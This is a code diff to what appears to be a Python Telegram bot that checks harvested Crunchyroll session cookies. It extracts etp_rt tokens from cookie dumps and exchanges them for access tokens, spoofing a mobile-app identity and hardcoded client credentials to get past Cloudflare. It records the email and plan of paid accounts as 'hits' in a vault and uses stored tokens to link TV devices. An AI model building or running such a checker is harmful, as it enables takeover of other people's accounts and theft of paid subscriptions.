@@ -43,10 +43,10 @@ DATA_DIR = Path("data")
 DATA_DIR.mkdir(parents=True, exist_ok=True)
 VAULT_PATH = DATA_DIR / "cr_vault.json"
 
-# API endpoints
+# App/Mobile API Endpoints (Cloudflare Bypass)
 WEB_HOST = "https://www.crunchyroll.com"
-API_HOST = "https://beta-api.crunchyroll.com"  # Cloudflare bypass
-BARO_WUA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+API_HOST = "https://beta-api.crunchyroll.com"
+APP_UA = "Crunchyroll/3.65.0 Android/10 okhttp/4.12.0"
 
 # ===================== WEB SERVER (Render Fix) =====================
 def run_health_check():
@@ -100,7 +100,7 @@ def add_to_vault(entries: List[dict]) -> int:
 def extract_cookies_from_text(text: str) -> List[str]:
     cookies = set()
     
-    # 1. Netscape Format
+    # 1. Netscape Format (Standard cookie txt)
     for line in text.split('\n'):
         line = line.strip()
         if not line or (line.startswith('#') and not line.startswith('#HttpOnly_')): continue
@@ -123,7 +123,7 @@ def extract_cookies_from_text(text: str) -> List[str]:
                         if val: cookies.add(val)
     except: pass
 
-    # 3. Regex Patterns
+    # 3. Regex Patterns (For raw text formats)
     patterns = [
         r'etp_rt[=\s]+([a-f0-9-]{36})',
         r'etp_rt["\']?\s*:\s*["\']([^"\']+)',
@@ -152,38 +152,49 @@ def check_cookie(etp_rt: str):
     session = requests.Session()
     session.verify = False
     
-    # STEP 1: Get Token via Beta API
+    # STEP 1: Get Token (Mobile App Flow to bypass Cloudflare)
     data = {
         "grant_type": "etp_rt_cookie",
         "device_id": str(uuid.uuid4()),
-        "device_type": "Chrome on Windows"
+        "device_type": "Android TV"
     }
     headers = {
-        "User-Agent": BARO_WUA,
+        "Authorization": "Basic bm9haWhkZXZtXzZpeWcwYThsMHE6", # Crunchyroll Basic Auth
         "Content-Type": "application/x-www-form-urlencoded",
-        "Accept": "application/json",
-        "Origin": WEB_HOST,
-        "Referer": f"{WEB_HOST}/"
+        "User-Agent": APP_UA,
+        "ETP-Anonymous-ID": str(uuid.uuid4()), # Mandatory header
+        "Accept": "application/json, text/plain, */*",
+        "Accept-Encoding": "gzip",
+        "Connection": "Keep-Alive",
+        "Origin": "https://www.crunchyroll.com",
+        "Referer": "https://www.crunchyroll.com/"
     }
     
     try:
         r = session.post(f"{API_HOST}/auth/v1/token", data=data, headers=headers, cookies={"etp_rt": etp_rt}, timeout=15)
-        if r.status_code != 200: return {"status": "error", "code": r.status_code}
+        if r.status_code != 200: 
+            return {"status": "error", "code": f"HTTP_{r.status_code}"}
         token_data = r.json()
         access_token = token_data.get('access_token')
-        if not access_token: return {"status": "error", "code": "no_token"}
-    except:
+        if not access_token: 
+            return {"status": "error", "code": "no_token"}
+    except Exception as e:
         return {"status": "error", "code": "network"}
 
     # STEP 2: Get User Info
-    hdr = {"Authorization": f"Bearer {access_token}", "User-Agent": BARO_WUA}
+    hdr = {
+        "Authorization": f"Bearer {access_token}", 
+        "User-Agent": APP_UA,
+        "Accept": "application/json"
+    }
     try:
         r = session.get(f"{API_HOST}/accounts/v1/me", headers=hdr, timeout=15)
-        if r.status_code != 200: return {"status": "error", "code": r.status_code}
+        if r.status_code != 200: 
+            return {"status": "error", "code": f"me_{r.status_code}"}
         me = r.json()
         email = me.get("email", "N/A")
         acc_id = me.get("account_id")
-    except:
+    except Exception:
         return {"status": "error", "code": "me_failed"}
 
     # STEP 3: Check Subscription
@@ -197,7 +208,7 @@ def check_cookie(etp_rt: str):
                 expiry = sub.get("nextRenewalDate", "")[:10]
                 return {"status": "hit", "email": email, "plan": plan, "expiry": expiry, "token": access_token}
         return {"status": "free"}
-    except:
+    except Exception:
         return {"status": "error", "code": "sub_failed"}
 
 # ===================== BOT HANDLERS =====================
@@ -309,7 +320,7 @@ async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
         token = entry.get("data", {}).get("token")
         if not token: continue
         
-        headers = {"Authorization": f"Bearer {token}", "User-Agent": BARO_WUA, "Content-Type": "application/json"}
+        headers = {"Authorization": f"Bearer {token}", "User-Agent": APP_UA, "Content-Type": "application/json"}
         for base in (WEB_HOST, API_HOST):
             try:
                 r = requests.post(f"{base}/auth/v1/device", json={"user_code": code}, headers=headers, timeout=15)
